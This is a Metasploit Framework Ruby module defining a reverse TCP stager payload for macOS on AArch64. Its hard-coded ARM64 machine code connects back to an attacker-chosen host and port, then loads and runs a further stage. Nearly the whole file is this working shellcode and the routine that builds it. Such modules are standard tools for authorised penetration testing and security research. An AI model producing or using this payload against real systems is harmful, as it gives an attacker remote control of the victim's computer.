##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##



###
#
# ReverseTcp
# ----------
#
# Osx reverse TCP stager.
#
###
module MetasploitModule

  CachedSize = 328

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'usiegl00',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_AARCH64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        => { 'RequiresMidstager' => false},
      'Convention'    => 'sockedi',
    ))
  end

  def generate(opts = {})
    encoded_port = [datastore['LPORT'].to_i,2].pack("vv").unpack("N").first
    encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
    retry_count = datastore['StagerRetryCount']
    seconds = datastore['StagerRetryWait']
    sleep_seconds = seconds.to_i
    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i

    payload = [
      # Generated from external/source/shellcode/osx/aarch64/stager_sock_reverse.s
      0xaa1f03e0,
      0xd2820001,
      0xd2800042,
      0xd2820043,
      0xaa3f03e4,
      0xaa1f03e5,
      0x580007d0,
      0xd4000001,
      0xb100041f,
      0x54000600,
      0xaa0003ec,
      0xd280000a,
      0x1000064b,
      0xf940016b,
      0xd2800040,
      0xd2800021,
      0xd2800002,
      0x580006b0,
      0xd4000001,
      0xaa0003ed,
      0x10000501,
      0xf9400021,
      0xf81f8fe1,
      0x910003e1,
      0xd2800202,
      0x580005f0,
      0xd4000001,
      0xaa0d03e0,
      0xaa0c03e1,
      0xd2802902,
      0xd2800803,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000530,
      0xd4000001,
      0xaa0c03e0,
      0xd2802901,
      0xd28000a2,
      0x580004d0,
      0xd4000001,
      0xd61f0180,
      0xd100056b,
      0xf100017f,
      0x540001c0,
      0xd2800000,
      0xd2800001,
      0x10000242,
      0xf9400042,
      0x10000243,
      0xf9400063,
      0xa9bf0be3,
      0x910003e4,
      0xd2800002,
      0xd2800003,
      0x58000310,
      0xd4000001,
      0x54ffface,
      0xd2800020,
      0x580002d0,
      0xd4000001,
      encoded_port,
      encoded_host,
      retry_count,
      0x00000000,
      sleep_nanoseconds,
      0x00000000,
      sleep_seconds,
      0x00000000,
      0x020000c5,
      0x00000000,
      0x02000061,
      0x00000000,
      0x02000062,
      0x00000000,
      0x0200001d,
      0x00000000,
      0x0200004a,
      0x00000000,
      0x0200005d,
      0x00000000,
      0x02000001,
      0x00000000,
    ].pack("V*")    
    return payload
  end
end
